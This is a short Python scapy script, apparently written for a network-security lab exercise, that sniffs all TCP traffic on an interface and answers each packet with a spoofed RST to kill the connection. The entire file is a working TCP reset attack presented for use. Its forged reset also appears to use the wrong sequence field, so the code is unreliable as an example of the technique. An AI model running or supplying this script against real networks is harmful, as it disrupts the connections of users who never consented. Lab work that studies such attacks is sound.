from scapy.all import *


def send_rst(packet):
    # Extract (Src IP, Dst IP, Src Port, Dst Port) from sniffed pkts
    src_ip, src_port, dst_ip, dst_port = packet[IP].src, packet[TCP].sport, packet[IP].dst, packet[TCP].dport
    # Get Seq Num from sniffed pkts
    seq_num = packet[TCP].seq
    # Create pkt with RST and flags
    rst_pkt = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", seq=seq_num)
    # Send the RST Packet
    send(rst_pkt, verbose=0)
    print(f"RST Packet sent to {src_ip}:{src_port} from {dst_ip}:{dst_port}")


def main():
    print("The TCP-Reset Attack is now live...")
    sniff(iface="br-298494f21682", filter=f"tcp", prn=send_rst) # iface for my PC

if __name__ == "__main__":
    main()